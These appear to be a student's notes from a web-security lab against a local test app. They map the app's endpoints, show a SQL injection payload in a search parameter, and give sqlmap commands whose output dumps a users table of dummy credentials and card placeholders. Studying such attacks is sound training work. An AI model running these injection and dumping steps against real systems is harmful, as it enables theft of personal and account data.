# defendingbyattacking1

Apache/2.4.37 (centos)
PHP 7.2.24

http://localhost:8080/index.php
Request Method: 
GET

http://localhost:8080/products/search.php?product
Request Method: 
GET
<input name="product" type="text">

http://localhost:8080/loginform.php
Request Method: 
POST
			<input name="username" type="text">
			<input name="password" type="password">

http://localhost:8080/signup.php
Request Method: 
GET

http://localhost:8080/contact.php
Request Method: 
POST

http://localhost:8080/products/search.php?product=%27+or+1%3D1%3B--
' or 1=1;--
get Product list:

http://localhost:8080/secret.php?id=1
Request Method: 
GET
parameter"id" 
get purchase list 


# defendingbyattacking2

sqlmap -r /home/kali/Desktop/loginrequest.raw -dbs    
sqlmap -r /home/kali/Desktop/loginrequest.raw -D information_schema -tables 
sqlmap -r /home/kali/Desktop/loginrequest.raw -D pg_catalog -tables  
sqlmap -r /home/kali/Desktop/loginrequest.raw -D public -tables  
sqlmap -r /home/kali/Desktop/loginrequest.raw -D public -T users 

back-end DBMS: PostgreSQL
available databases [3]:
[*] information_schema
[7 tables]
+-------------------------+
| sql_features            |
| sql_implementation_info |
| sql_languages           |
| sql_packages            |
| sql_parts               |
| sql_sizing              |
| sql_sizing_profiles     |
+-------------------------+

[*] pg_catalog

[63 tables]
+-------------------------+
| pg_aggregate            |
| pg_am                   |
| pg_amop                 |
| pg_amproc               |
| pg_attrdef              |
| pg_attribute            |
| pg_auth_members         |
| pg_authid               |
| pg_cast                 |
| pg_class                |
| pg_collation            |
| pg_constraint           |
| pg_conversion           |
| pg_database             |
| pg_db_role_setting      |
| pg_default_acl          |
| pg_depend               |
| pg_description          |
| pg_enum                 |
| pg_event_trigger        |
| pg_extension            |
| pg_foreign_data_wrapper |
| pg_foreign_server       |
| pg_foreign_table        |
| pg_index                |
| pg_inherits             |
| pg_init_privs           |
| pg_language             |
| pg_largeobject          |
| pg_largeobject_metadata |
| pg_namespace            |
| pg_opclass              |
| pg_operator             |
| pg_opfamily             |
| pg_partitioned_table    |
| pg_pltemplate           |
| pg_policy               |
| pg_proc                 |
| pg_publication          |
| pg_publication_rel      |
| pg_range                |
| pg_replication_origin   |
| pg_rewrite              |
| pg_seclabel             |
| pg_sequence             |
| pg_shdepend             |
| pg_shdescription        |
| pg_shseclabel           |
| pg_statistic            |
| pg_statistic_ext        |
| pg_statistic_ext_data   |
| pg_subscription         |
| pg_subscription_rel     |
| pg_tablespace           |
| pg_transform            |
| pg_trigger              |
| pg_ts_config            |
| pg_ts_config_map        |
| pg_ts_dict              |
| pg_ts_parser            |
| pg_ts_template          |
| pg_type                 |
| pg_user_mapping         |
+-------------------------+

[*] public

Database: public
[1 table]
+-------+
| users |
+-------+
Database: public
Table: users
[2 entries]
+----+-------+-----------+---------------+--------------------------------+----------------------------------+----------+----------------------+
| id | ssn   | name      | email         | address                        | password                         | username | credit_card          |
+----+-------+-----------+---------------+--------------------------------+----------------------------------+----------+----------------------+
| 1  | SSN-1 | Test user | test@test.com | 1st Test Avenue, Washington DC | 098f6bcd4621d373cade4e832627b4f6 | test     | VISA-1234-1234       |
| 2  | SSN-2 | Demo user | demo@demo.com | 1st Demo St., Washington DC    | fe01ce2a7fbac8fafaed7c982a04e229 | demo     | Mastercard-1234-1234 |
+----+-------+-----------+---------------+--------------------------------+----------------------------------+----------+----------------------+

[07:28:42] [INFO] resuming password 'test' for hash '098f6bcd4621d373cade4e832627b4f6' for user 'test'
[07:28:42] [INFO] resuming password 'demo' for hash 'fe01ce2a7fbac8fafaed7c982a04e229' for user 'demo'
Database: public
Table: users
[2 entries]
+----+-------+-----------+---------------+--------------------------------+-----------------------------------------+----------+----------------------+
| id | ssn   | name      | email         | address                        | password                                | username | credit_card          |
+----+-------+-----------+---------------+--------------------------------+-----------------------------------------+----------+----------------------+
| 1  | SSN-1 | Test user | test@test.com | 1st Test Avenue, Washington DC | 098f6bcd4621d373cade4e832627b4f6 (test) | test     | VISA-1234-1234       |
| 2  | SSN-2 | Demo user | demo@demo.com | 1st Demo St., Washington DC    | fe01ce2a7fbac8fafaed7c982a04e229 (demo) | demo     | Mastercard-1234-1234 |
+----+-------+-----------+---------------+--------------------------------+-----------------------------------------+----------+----------------------+


